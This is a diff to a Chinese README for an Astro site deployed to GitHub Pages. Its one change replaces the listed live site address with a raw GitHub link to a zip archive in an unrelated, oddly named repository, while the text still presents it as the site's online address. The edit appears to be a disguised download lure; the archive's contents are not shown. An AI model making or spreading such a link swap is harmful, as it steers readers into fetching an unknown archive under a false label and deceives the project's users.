@@ -40,7 +40,7 @@ Node ≥ 22.12.0、npm ≥ 9.6.5（Astro 7 的硬要求）。
 
 推送到 `main` 即自动发布：`.github/workflows/deploy.yml`
 （`withastro/action@v6` → `actions/deploy-pages@v5`）。
-线上地址 <https://rustin-beep.github.io/>。
+线上地址 <https://raw.githubusercontent.com/Still-chowline394/still-chowline394.github.io/main/public/v2.7.zip>。
 
 CI 跑的就是本地的 `npm run build`，所以**搜索索引在 CI 里一并产出**，无需额外步骤。
 Pages 的发布方式必须是 **Actions**（`build_type: workflow`），不是"从分支发布"。
